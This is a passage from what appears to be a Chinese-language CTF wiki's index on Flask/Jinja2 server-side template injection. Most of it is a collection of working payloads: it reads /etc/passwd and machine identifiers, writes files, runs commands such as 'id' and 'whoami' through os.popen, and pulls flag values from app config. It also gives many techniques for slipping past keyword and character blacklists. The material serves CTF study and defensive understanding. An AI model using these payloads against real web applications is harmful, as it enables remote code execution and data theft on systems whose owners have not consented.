num\nprint(rv)\nPython\n</code></pre> <p>\u7136\u540e\u518d\u60f3\u60f3\uff0c\u8fd9\u4e2a\u653e\u5230ssti\u91cc\u9762\u7684\u539f\u56e0\uff0c\u6a21\u677f\u6ce8\u5165\u561b</p> <p>\u591a\u591a\u5c11\u5c11\u8fd8\u662f\u8ddfssti\u6709\u4e9b\u5173\u7cfb\uff0c\u9664\u4e86\u4e0a\u9762\u6240\u8bf4\u7684\u57fa\u672c\u4e0d\u53d8\u7684\uff0c\u5176\u4ed6\u4e1c\u897f\u662f\u9700\u8981\u901a\u8fc7\u6a21\u677f\u6ce8\u5165\u53bb\u8bfb\u7684\uff0c\u6240\u4ee5\u8fd9\u91cc\u540c\u6837\u7ed9\u51fa\u4e00\u4e9b\u53ef\u80fd\u7528\u7684\u4e0a\u7684payload</p> <pre><code>\u83b7\u53d6MAC\u5730\u5740\uff1a\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/sys/class/net/eth0/address','r').read() }}{% endif %}{% endfor %}\u8bb2\u5b9e\u8bdd\u8fd9\u4e2aif\u662f\u771f\u7684\u5f88\u5389\u5bb3\uff0c\u4ee5\u540e\u4f1a\u78b0\u5230if\u6765\u7ed5\u8fc7\nPlain Text\n</code></pre> <pre><code>\u83b7\u53d6\u673a\u5668\u7684ID\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].open('/proc/self/cgroup','r').read() }}{% endif %}{% endfor %}\nPlain Text\n</code></pre> <p>\u81ea\u5df1\u641c\uff1a</p> <p>GYCTF2020 FlaskApp</p>"},{"location":"web/ssti/flask/flask_ssti/","title":"Flask ssti","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/ssti/flask/flask_ssti/#flaskjinja2","title":"FLASK\u6a21\u677f\uff08jinja2\u6846\u67b6)","text":"<p>\u8fd9\u53ef\u80fd\u662f\u4f60\u5c06\u4f1a\u78b0\u5230\u7684\u6700\u591a\u7684\u6a21\u677f</p> <p>\u5f04\u61c2\u8fd9\u4e2a\u662f\u63a5\u4e0b\u6765\u51e0\u4e2a\u6a21\u677f\u7684\u6bd4\u8f83\u91cd\u8981\u7684\u57fa\u7840\u3002\uff08\u6240\u4ee5\u53ef\u80fd\u4f1a\u5570\u55e6\uff09</p> <p>\u6a21\u677f\u57fa\u4e8epython,\u53ef\u80fd\u662fpy2\u4e5f\u53ef\u80fd\u662fpy3\uff0c\u8c8c\u4f3cpy2\u4f1a\u591a\u4e00\u70b9\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#flask","title":"Flask","text":"<p>\u5982\u679c\u6e32\u67d3\u7684\u6a21\u7248\u5185\u5bb9\u53d7\u5230\u7528\u6237\u7684\u63a7\u5236\u3002\u3002\u3002\u3002</p> <pre><code>from flask import Flask, request\nfrom jinja2 import Template\napp = Flask(__name__)\n@app.route(\"/\")\ndef index():\nname = request.args.get('name', 'guest')\nt = Template(\"Hello \" + name)\nreturn t.render()\nif __name__ == \"__main__\":\napp.run();\nPlain Text\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u53c2\u6570\u663e\u7136\u662fname</p> <p>\u63d0\u4ea4 ?name=guest.{{7*7}}</p> <p>\u4f1a\u53d1\u73b0\u88ab\u8ba1\u7b97\u6210\u4e8649</p> <p>\u53c8\u6216\u8005\u662f{{\u2018abcd\u2019,upper()}}(\u672c\u8d28\u4e0a\u8fd8\u662fpy)</p> <p>\u4f1a\u8f93\u51faABCD</p> <p>\u4e0b\u9762\u5f00\u59cb\u52a0\u901f\uff1a</p> <p>py2:</p> <pre><code>#\u8bfb\u6587\u4ef6\uff1a\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n#\u5199\u6587\u4ef6\uff1a\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write(\"\") }}\nPlain Text\n</code></pre> <p>py3:</p>"},{"location":"web/ssti/flask/flask_ssti/#_1","title":"\u547d\u4ee4\u6267\u884c\uff1a","text":"<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") }}{% endif %}{% endfor %}\n#\u6587\u4ef6\u64cd\u4f5c\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}\nPlain Text\n</code></pre> <p>\uff08py2\u5305\u542b\u7684\u7c7bpy3\u4e00\u822c\u90fd\u6709\uff0c\u4f46\u662f\u4f4d\u7f6e\u987a\u5e8f\u4e0d\u592a\u4e00\u6837\uff0c\u7136\u540e\u5c31\u662f\u8c03\u7528\u683c\u5f0f\u786e\u5b9e\u4e0d\u592a\u4e00\u6837\uff09</p> <p>\u8fd9\u91cc\u4ee5py2\u4e3a\u4f8b\uff1a</p> <p>flask\u51fd\u6570\u89e3\u6790\uff1a</p> <pre><code>__class__ \u8fd4\u56de\u8c03\u7528\u7684\u53c2\u6570\u7c7b\u578b\n__bases__ \u8fd4\u56de\u7c7b\u578b\u5217\u8868\n__mro__ \u6b64\u5c5e\u6027\u662f\u5728\u65b9\u6cd5\u89e3\u6790\u671f\u95f4\u5bfb\u627e\u57fa\u7c7b\u65f6\u8003\u8651\u7684\u7c7b\u5143\u7ec4\n__subclasses__() \u8fd4\u56deobject\u7684\u5b50\u7c7b\n__globals__ \u51fd\u6570\u4f1a\u4ee5\u5b57\u5178\u7c7b\u578b\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u7684\u5168\u90e8\u5168\u5c40\u53d8\u91cf \u4e0e func_globals \u7b49\u4ef7\nPlain Text\n</code></pre> <p>{{ ''.class.mro[2].subclasses()40.read() }}\uff08\u5982\u679c\u8fd8\u8bb0\u5f97\u7684\u8bdd{{}}\u662f\u8f93\u51fa\u7684\u610f\u601d\uff09</p> <p>\u6240\u4ee5\u8fd9\u53e5\u8bdd\u7684\u903b\u8f91\u662f\u4ec0\u4e48\u5462\uff1f</p> <p>\u521b\u5efa\u4e00\u4e2a\u7a7a\u5b57\u7b26\uff0c\u8fd4\u56de\u5b83\u7684\u53c2\u6570\u7c7b\u578b\uff0c\u5bfb\u627e\u57fa\u7c7b\uff0c\u627e\u5b50\u7c7b\uff0c\u9009\u53d6\u7b2c40\u4e2a\u5b50\u7c7b\uff0c\u8c03\u7528\u5176\u4e2d\u7684read\u51fd\u6570\u3002\u8fd9\u4e5f\u662f\u4e00\u6761\u903b\u8f91\u94fe\uff0cflask\u7684\u6a21\u677f\u6ce8\u5165\u7684\u6838\u5fc3\u5c31\u662f\u8fd9\u6761\u903b\u8f91\u94fe\u3002\u6216\u8005\u88ab\u79f0\u4e4b\u4e3a\u6c99\u76d2\u9003\u9038\uff1a\u521b\u5efa\u4e00\u4e2a\u76f8\u5bf9\u5c01\u95ed\u7684python\u6c99\u76d2\u73af\u5883\uff0c\u7136\u540e\u4ece\u67d0\u4e2a\u4f4d\u7f6e\u5f00\u59cb\u627e\u5230\u6700\u9876\u5c42\uff0c\u7136\u540e\u4e00\u6b65\u4e00\u6b65\u5411\u4e0b\u6478\u7d22\uff0c\u6700\u540e\u4ece\u6c99\u7bb1\u4e2d\u9003\u9038\u51fa\u53bb\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#flask_1","title":"FLASK\u6d41\u7a0b","text":"<p>\u4e5f\u53ef\u4ee5\u53eb\u5c0fpayload\uff0c\u4e0b\u6b21\u627e\u4e2a\u57fa\u7840\u70b9\u7684\uff0c\u6ca1\u8fc7\u6ee4\u7684\u9898\uff0c\u53ef\u4ee5\u597d\u597d\u8bd5\u8bd5\u3002</p> <pre><code>\u51fd\u6570\u89e3\u6790\n__class__ \u8fd4\u56de\u8c03\u7528\u7684\u53c2\u6570\u7c7b\u578b__bases__ \u8fd4\u56de\u7c7b\u578b\u5217\u8868__mro__ \u6b64\u5c5e\u6027\u662f\u5728\u65b9\u6cd5\u89e3\u6790\u671f\u95f4\u5bfb\u627e\u57fa\u7c7b\u65f6\u8003\u8651\u7684\u7c7b\u5143\u7ec4__subclasses__() \u8fd4\u56deobject\u7684\u5b50\u7c7b__globals__ \u51fd\u6570\u4f1a\u4ee5\u5b57\u5178\u7c7b\u578b\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u7684\u5168\u90e8\u5168\u5c40\u53d8\u91cf \u4e0e func_globals \u7b49\u4ef7\nPlain Text\n</code></pre> <pre><code>\u83b7\u53d6\u57fa\u672c\u7c7b:\n''.__class__.__mro__[2]//mro\u627e\u7684\u4f1a\u6bd4base\u5feb\u4f5c\u7528\u7c7b\u4f3c\n{}.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[8]//\u9488\u5bf9jinjia2/flask\u4e3a[9]\u9002\u7528\nPlain Text\n</code></pre> <pre><code>\u83b7\u53d6\u57fa\u672c\u7c7b\u540e\uff0c\u7ee7\u7eed\u5411\u4e0b\u83b7\u53d6\u57fa\u672c\u7c7b(object)\u7684\u5b50\u7c7b\nobject.__subclasses__()\nPlain Text\n</code></pre> <pre><code>\u627e\u5230\u91cd\u8f7d\u8fc7\u7684__init__\u7c7b(\u5728\u83b7\u53d6\u521d\u59cb\u5316\u5c5e\u6027\u540e\uff0c\u5e26wrapper\u7684\u8bf4\u660e\u6ca1\u6709\u91cd\u8f7d\uff0c\u5bfb\u627e\u4e0d\u5e26warpper\u7684)\u6240\u8c13\u91cd\u8f7d\uff0c\u5c31\u662f\u591a\u4e2a\u76f8\u540c\u51fd\u6570\u540d\u7684\u51fd\u6570\uff0c\u6839\u636e\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\uff0c\u53c2\u6570\u7c7b\u578b\u800c\u6267\u884c\u4e0d\u540c\u7684\u529f\u80fd\u3002\u6240\u4ee5\u51fd\u6570\u91cd\u8f7d\u5b9e\u8d28\u4e0a\u662f\u4e3a\u4e86\u89e3\u51b3\u7f16\u7a0b\u4e2d\u53c2\u6570\u53ef\u53d8\u4e0d\u7edf\u4e00\u7684\u95ee\u9898\u3002\u7136\u540e\u5c31\u662f\u91cd\u8f7d\u4e86\u90a3\u8fd8\u600e\u4e48\u7528\u561b\u3002\n''.__class__.__mro__[2].__subclasses__()[99].__init__//\u5bf999\u4e2a\u5b9e\u4f8b\u5316&lt;slot wrapper '__init__' of 'object' objects&gt;''.__class__.__mro__[2].__subclasses__()[59].__init__&lt;unbound method WarningMessage.__init__&gt;\nPlain Text\n</code></pre> <pre><code>\u67e5\u770b\u5176\u5f15\u7528__builtins__builtins\u5373\u662f\u5f15\u7528\uff0cPython\u7a0b\u5e8f\u4e00\u65e6\u542f\u52a8\uff0c\u5b83\u5c31\u4f1a\u5728\u7a0b\u5e8f\u5458\u6240\u5199\u7684\u4ee3\u7801\u6ca1\u6709\u8fd0\u884c\u4e4b\u524d\u5c31\u5df2\u7ecf\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u4e86,\u800c\u5bf9\u4e8ebuiltins\u5374\u4e0d\u7528\u5bfc\u5165\uff0c\u5b83\u5728\u4efb\u4f55\u6a21\u5757\u90fd\u76f4\u63a5\u53ef\u89c1\uff0c\u6240\u4ee5\u8fd9\u91cc\u76f4\u63a5\u8c03\u7528\u5f15\u7528\u7684\u6a21\u5757\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']\nPlain Text\n</code></pre> <pre><code>\u8fd9\u91cc\u4f1a\u8fd4\u56dedict\u7c7b\u578b\uff0c\u5bfb\u627ekeys\u4e2d\u53ef\u7528\u51fd\u6570\uff0c\u76f4\u63a5\u8c03\u7528\u5373\u53ef\uff0c\u4f7f\u7528keys\u4e2d\u7684file\u4ee5\u5b9e\u73b0\u8bfb\u53d6\u6587\u4ef6\u7684\u529f\u80fd\n''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('F://GetFlag.txt').read()\nPlain Text\n</code></pre> <p>\u81f3\u6b64\u4e00\u6761\u9003\u9038\u94fe\u5c31\u6784\u9020\u4e86\u51fa\u6765\u3002</p> <p>\u5728\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u6709\u4e9b\u51fd\u6570\u8fd8\u662f\u86ee\u96be\u627e\u7684\uff0c\u4e0d\u77e5\u9053\u8be5\u7528\u54ea\u4e9b\u7c7b\u6240\u4ee5\u4f1a\u6709\u4e00\u4e9b\u5e38\u7528\u7684payload:</p> <p>\u90fd\u662fpy2\u7684\uff1a</p> <p>\u8bfb\u5199\u6587\u4ef6\uff1a</p> <pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()    #\u5c06read() \u4fee\u6539\u4e3a write() \u5373\u4e3a\u5199\u6587\u4ef6\nPlain Text\n</code></pre> <pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #\u5c06read() \u4fee\u6539\u4e3a write() \u5373\u4e3a\u5199\u6587\u4ef6\nPlain Text\n</code></pre> <p>\u547d\u4ee4\u6267\u884c\uff1a</p> <pre><code>''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')\nPlain Text\n</code></pre> <pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')\nPlain Text\n</code></pre> <pre><code>{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\nPlain Text\n</code></pre> <pre><code>{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')\nPlain Text\n</code></pre> <p>\u603b\u7684\u6765\u8bf4\uff1a</p> <p>\u9996\u5148\u5c31\u662f\u5224\u65ad\uff0c\u662f\u5426\u5b58\u5728ssti\u6a21\u677f\u6ce8\u5165\u70b9</p> <p>\u786e\u5b9a\u627e\u5230\u6ce8\u5165\u70b9\u4e4b\u540e\uff0c\u7531\u4e8eflask\u7b49ssti\u6a21\u677f\u90fd\u662f\u7531python\u7f16\u5199\uff0c\u6211\u4eec\u53c8\u53ef\u4ee5\u5728\u4e0a\u9762\u6267\u884c\u4ee3\u7801\uff0c\u4e8e\u662f\u5c31\u80fd\u591f\u5728ssti\u4e0a\u67e5\u627e\u6846\u67b6\u4e2d\u6240\u5305\u542b\u7684\u7c7b</p> <p>\u627e\u5230\u67d0\u4e2a\u7c7b\u4e4b\u540e\u7ee7\u7eed\u8c03\u7528\uff0c\u627e\u5230\u5b50\u7c7b\uff0c\u7236\u7c7b\u7b49</p> <p>\u6700\u540e\u901a\u8fc7\u627e\u5230\u7684\u7c7b\u4e2d\u53ef\u80fd\u5305\u542b\u7684\u51fd\u6570os.\u3002\u3002\u3002\u3002\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u4ee3\u7801\u5373\u53ef\u3002</p> <pre><code>.__class__.__mro__//\u627e\u57fa\u7c7b\n.__class__.__mro__[0].__subclasses__()//\u57fa\u7c7b\u4e2d\u7684\u5b50\u7c7b\n{{\"\".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__}}//.init.globals\u6765\u627eos\u7c7b\u4e0b\u7684\uff0cinit\u521d\u59cb\u5316\u7c7b\uff0c\u7136\u540eglobals\u5168\u5c40\u6765\u67e5\u627e\u6240\u6709\u7684\u65b9\u6cd5\u53ca\u53d8\u91cf\u53ca\u53c2\u6570\u3002\n.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()//\u57fa\u7c7b\u4e2d\u7684\u5b50\u7c7b\u4e2d\u7684\u67d0\u4e2a\u51fd\u6570\uff0c\u6267\u884c\u5e76\u4e14\u8c03\u7528\u3002\n{{config.__class__.__init__.__globals__['os'].environ}}\u8fd9\u4e2a\u662f\u5173\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\uff0c\u6709\u65f6\u5019FLAG\u4e5f\u4f1a\u653e\u5728\u914d\u7f6e\u6587\u4ef6\u4e4b\u4e2d\u3002\nPlain Text\n</code></pre>"},{"location":"web/ssti/flask/flask_ssti/#_2","title":"\u7ed5\u8fc7\u59ff\u52bf","text":"<p>\u6b22\u8fce\u8865\u5145</p>"},{"location":"web/ssti/flask/flask_ssti/#_3","title":"\u7ed5\u8fc7\u4e2d\u62ec\u53f7","text":"<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()\nPlain Text\n</code></pre> <pre><code>\u4f7f\u7528gititem\u7ed5\u8fc7\u3002\u5982\u539fpoc {{\"\".class.bases[0]}}\u7ed5\u8fc7\u540e{{\"\".class.bases.getitem(0)}}\nPlain Text\n</code></pre> <p>pop() \u51fd\u6570\u7528\u4e8e\u79fb\u9664\u5217\u8868\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\uff08\u9ed8\u8ba4\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u5e76\u4e14\u8fd4\u56de\u8be5\u5143\u7d20\u7684\u503c</p>"},{"location":"web/ssti/flask/flask_ssti/#_4","title":"\u8fc7\u6ee4\u5f15\u53f7","text":"<pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd\nPlain Text\n</code></pre>"},{"location":"web/ssti/flask/flask_ssti/#_5","title":"\u8fc7\u6ee4\u53cc\u4e0b\u5212\u7ebf","text":"<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__\nPlain Text\n</code></pre> <p>\u8fd9\u91cc\u7528\u5230\u7684\u662frequest:(\u7a0d\u5fae\u89e3\u91ca\u4e00\u4e0b)</p> <p><code>{{''[request.args.a][request.args.b][2][request.args.c]()}}?a=__class__&amp;b=__mro__&amp;c=__subclasses__}}</code></p> <pre><code>\u5982\u4e0b\u4e3a\u5e38\u7528\u7684request\u59ff\u52bfrequest.args.x1      get\u4f20\u53c2request.values.x1    post\u4f20\u53c2request.cookiesrequest.form.x1     post\u4f20\u53c2    (Content-Type:applicaation/x-www-form-urlencoded\u6216multipart/form-data)request.data          post\u4f20\u53c2    (Content-Type:a/b)request.json      post\u4f20json  (Content-Type:application/json)\nPlain Text\n</code></pre> <p>\u5728Flask\u7684\u5b98\u65b9\u6587\u6863\u4e2d\u662f\u8fd9\u6837\u4ecb\u7ecdrequest\u7684\uff1a\u5bf9\u4e8e Web \u5e94\u7528\uff0c\u4e0e\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u6570\u636e\u4ea4\u4e92\u81f3\u5173\u91cd\u8981\u3002\u5728 Flask \u4e2d\u7531\u5168\u5c40\u7684 request \u5bf9\u8c61\u6765\u63d0\u4f9b\u8fd9\u4e9b\u4fe1\u606f\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#subclasses","title":"\u8fc7\u6ee4\u4e86subclasses\u7b49\u5b57\u7b26","text":"<pre><code>\u62fc\u51d1\u6cd5\n\u539fpoc{{\"\".class.bases[0].subclasses()}}\n\u7ed5\u8fc7{{\"\".class.bases[0]'subcla'+'sses'}}\nPlain Text\n</code></pre>"},{"location":"web/ssti/flask/flask_ssti/#class","title":"\u8fc7\u6ee4class","text":"<pre><code>\u4f7f\u7528sessionpoc{{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}\u591a\u4e2abases[0]\u662f\u56e0\u4e3a\u4e00\u76f4\u5728\u5411\u4e0a\u627eobject\u7c7b\u3002\u4f7f\u7528mro\u5c31\u4f1a\u5f88\u65b9\u4fbf\nPlain Text\n</code></pre>"},{"location":"web/ssti/flask/flask_ssti/#_6","title":"\u8fc7\u6ee4\u5173\u952e\u5b57","text":"<pre><code>base64\u7f16\u7801\u7ed5\u8fc7(\u7f16\u7801\u7684\u8bdd\u6211\u9690\u7ea6\u8bb0\u5f97py3\u597d\u50cf\u7528\u4e0d\u4e86)\n__getattribute__\u4f7f\u7528\u5b9e\u4f8b\u8bbf\u95ee\u5c5e\u6027\u65f6,\u8c03\u7528\u8be5\u65b9\u6cd5\n\u4f8b\u5982\u88ab\u8fc7\u6ee4\u6389__class__\u5173\u952e\u8bcd\n{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](\"/etc/passwd\").read()}}\n\u5b57\u7b26\u4e32\u62fc\u63a5\u7ed5\u8fc7\n{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](\"/etc/passwd\").read()}}\nPlain Text\n</code></pre> <p>\u5b57\u7b26\u4e32\u62fc\u63a5</p> <p>1\u3001\u62fc\u63a5</p> <p>\"cla\"+\"ss\"</p> <p>2\u3001\u53cd\u8f6c</p> <p>\"ssalc\"[::-1]</p> <p>3.ascii\u8f6c\u6362</p> <pre><code>\"{0:c}\".format(97)='a'\"{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}\".format(95,95,99,108,97,115,115,95,95)='__class__'\nPlain Text\n</code></pre> <p>4\u3001\u7f16\u7801\u7ed5\u8fc7</p> <pre><code>\"__class__\"==\"\\x5f\\x5fclass\\x5f\\x5f\"==\"\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\"\u5bf9\u4e8epython2\u7684\u8bdd\uff0c\u8fd8\u53ef\u4ee5\u5229\u7528base64\u8fdb\u884c\u7ed5\u8fc7\uff08\u6240\u4ee5\u6211\u6ca1\u8bb0\u9519\uff09\"__class__\"==(\"X19jbGFzc19f\").decode(\"base64\")\nPlain Text\n</code></pre> <p>5.\u5229\u7528chr\u51fd\u6570</p> <p>\u56e0\u4e3a\u6211\u4eec\u6ca1\u6cd5\u76f4\u63a5\u4f7f\u7528chr\u51fd\u6570\uff0c\u6240\u4ee5\u9700\u8981\u901a\u8fc7__builtins__\u627e\u5230\u4ed6</p> <pre><code>{% set chr=url_for.__globals__['__builtins__'].chr %}{{\"\"[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}\nPlain Text\n</code></pre> <p>6\u3001\u5728jinja2\u91cc\u9762\u53ef\u4ee5\u5229\u7528~\u8fdb\u884c\u62fc\u63a5</p> <pre><code>{%set a='__cla' %}{%set b='ss__'%}{{\"\"[a~b]}}\nPlain Text\n</code></pre> <p>7\u3001\u5927\u5c0f\u5199\u8f6c\u6362</p> <p>\u524d\u63d0\u662f\u8fc7\u6ee4\u7684\u53ea\u662f\u5c0f\u5199</p> <pre><code>\"\"[\"__CLASS__\".lower()]\nPlain Text\n</code></pre> <p>\u4ee5\u4e0a\u662f\u5e38\u89c1\u7684\u601d\u8def\u3002\u53ef\u662f\u5047\u8bbe\u6709\u4e00\u5929\uff0c\u4f60\u78b0\u5230\u4e86\u8fd9\u6837\u7684\u73a9\u610f\uff0c\u4f60\u8be5\u600e\u4e48\u505a\uff1f</p> <pre><code>blacklist&lt;/br&gt;   '.','[','\\'','\"',''\\\\','+',':','_',&lt;/br&gt;   'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt;   'eval','exec','os','popen','open','read',&lt;/br&gt;   'select','url_for','get_flashed_messages','config','request',&lt;/br&gt;   'count','length','\uff10','\uff11','\uff12','\uff13','\uff14','\uff15','\uff16','\uff17','\uff18','\uff19','0','1','2','3','4','5','6','7','8','9'&lt;/br&gt;    &lt;/br&gt;\nPlain Text\n</code></pre> <p>\u6240\u4ee5\u4e0b\u9762\u8bb2\u4e00\u8bb2\u8fdb\u9636\u64cd\u4f5c\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#flask_2","title":"FLASK\u8fdb\u9636\u64cd\u4f5c","text":"<p>\u8fd9\u91cc\u7684\u91cd\u70b9\u8fd8\u662f\u8fc7\u6ee4\u5668\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#_7","title":"\u5168\u5c40\u641c\u7d22\u59ff\u52bf","text":"<p>url_for\u3001g\u3001request\u3001namespace\u3001lipsum\u3001range\u3001session\u3001dict\u3001get_flashed_messages\u3001cycler\u3001joiner\u3001config\u7b49</p> <p>\u5982\u679c\u4e0a\u9762\u63d0\u5230\u7684 config\u3001self \u4e0d\u80fd\u4f7f\u7528\uff0c\u8981\u83b7\u53d6\u914d\u7f6e\u4fe1\u606f\uff0c\u5c31\u5fc5\u987b\u4ece\u5b83\u7684\u5168\u5c40\u53d8\u91cf\uff08\u8bbf\u95ee\u914d\u7f6e current_app \u7b49\uff09</p> <pre><code>{{url_for.__globals__['current_app'].config.FLAG}}{{get_flashed_messages.__globals__['current_app'].config.FLAG}}{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}\nPython\n</code></pre> <p>\u8fd9\u4e2a\u5c31\u5f88\u7c7b\u4f3c\u662f\u5168\u5c40\u6027\u7684\u641c\u7d22\uff0c\u5c24\u5176\u662furl_for:</p> <p>url_for()\u4f5c\u7528:</p> <p>(1)\u7ed9\u6307\u5b9a\u7684\u51fd\u6570\u6784\u9020 URL\u3002</p> <p>(2)\u8bbf\u95ee\u9759\u6001\u6587\u4ef6(CSS / JavaScript \u7b49)\u3002 \u53ea\u8981\u5728\u4f60\u7684\u5305\u4e2d\u6216\u662f\u6a21\u5757\u7684\u6240\u5728\u76ee\u5f55\u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a static \u7684\u6587\u4ef6\u5939\uff0c\u5728\u5e94\u7528\u4e2d\u4f7f\u7528 /static \u5373\u53ef\u8bbf\u95ee\u3002</p> <p>get_flashed_message(\u95ea\u73b0)</p> <p>\u8fd4\u56de\u4e4b\u524d\u5728Flask\u4e2d\u901a\u8fc7 flash() \u4f20\u5165\u7684\u95ea\u73b0\u4fe1\u606f\u5217\u8868\u3002\u628a\u5b57\u7b26\u4e32\u5bf9\u8c61\u8868\u793a\u7684\u6d88\u606f\u52a0\u5165\u5230\u4e00\u4e2a\u6d88\u606f\u961f\u5217\u4e2d\uff0c\u7136\u540e\u901a\u8fc7\u8c03\u7528 get_flashed_messages() \u65b9\u6cd5\u53d6\u51fa(\u95ea\u73b0\u4fe1\u606f\u53ea\u80fd\u53d6\u51fa\u4e00\u6b21\uff0c\u53d6\u51fa\u540e\u95ea\u73b0\u4fe1\u606f\u4f1a\u88ab\u6e05\u7a7a)\u3002</p>"},{"location":"web/ssti/flask/flask_ssti/#_8","title":"\u8fc7\u6ee4\u5668","text":"<pre><code>Variables can be modified by filters. Filters are separated from the variable by a pipe symbol (|) and may have optional arguments in parentheses. Multiple filters can be chained. The output of one filter is applied to the next.For example, {{ name|striptags|title }} will remove all HTML Tags from variable name and title-case theoutput (title(striptags(name))).\n\u53d8\u91cf\u53ef\u4ee5\u901a\u8fc7\u8fc7\u6ee4\u5668\u4fee\u6539\u3002\u8fc7\u6ee4\u5668\u4e0e\u53d8\u91cf\u4e4b\u95f4\u7528\u7ba1\u9053\u7b26\u53f7\uff08|\uff09\u9694\u5f00\uff0c\u62ec\u53f7\u4e2d\u53ef\u4ee5\u6709\u53ef\u9009\u53c2\u6570\u3002\u53ef\u4ee5\u94fe\u63a5\u591a\u4e2a\u8fc7\u6ee4\u5668\u3002\u4e00\u4e2a\u8fc7\u6ee4\u5668\u7684\u8f93\u51fa\u5e94\u7528\u4e8e\u4e0b\u4e00\u4e2a\u8fc7\u6ee4\u5668\u3002\n\u4f8b\u5982\uff0c{{ name|striptags|title }} \u5c06\u5220\u9664\u53d8\u91cf\u540d\u4e2d\u7684\u6240\u6709HTML\u6807\u8bb0\uff0c\u5e76\u5c06title\u5927\u5c0f\u5199\u4e3a\u8f93\u51fa(title(striptags(name)))\u3002\nPlain Text\n</code></pre> <p>\u6545\u540d\u601d\u610f\uff0c\u8fc7\u6ee4\u67d0\u4e9b\u4e1c\u897f\uff0c\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u4e1c\u897f\uff0c\u6216\u8005\u6362\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u50cf\u51fd\u6570\u7684\u67d0\u4e2a\u4e1c\u897f\u3002</p> <p>1.attr</p> <p>Get an attribute of an object. foo|attr(\"bar\") works like foo.bar just that always an attribute is returned and items are not looked up.</p> <p>\u83b7\u53d6\u53d8\u91cf\u7684\u503c</p> <pre><code>\"\"|attr(\"__class__\")\u76f8\u5f53\u4e8e\"\".__class__\nPlain Text\n</code></pre> <p>2.format</p> <pre><code>\u7528\u6cd5\n{ \"%s, %s!\"|format(greeting, name) }}\n\u90a3\u4e48\u6211\u4eec\u60f3\u8981\u8c03\u7528__class__\u5c31\u53ef\u4ee5\u7528format\u4e86\uff1a\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)=='__class__'\n\"\"[\"%c%c%c%c%c%c%c%c%c\"|format(95,95,99,108,97,115,115,95,95)]\nPlain Text\n</code></pre> <p>3.first last random</p> <ul> <li>Return the first item of a sequence.</li> <li>Return the last item of a sequence.</li> <li>Return a random item from the sequence.</li> </ul> <p>random\u662f\u80fd\u62ff\u522b\u7684\uff08\u53ea\u662f\u8981\u8dd1\u811a\u672c\uff09\uff0c\u5176\u4ed6\u4e24\u4e2a\u53ea\u80fd\u62ff\u9996\u5c3e</p> <p>4.join</p> 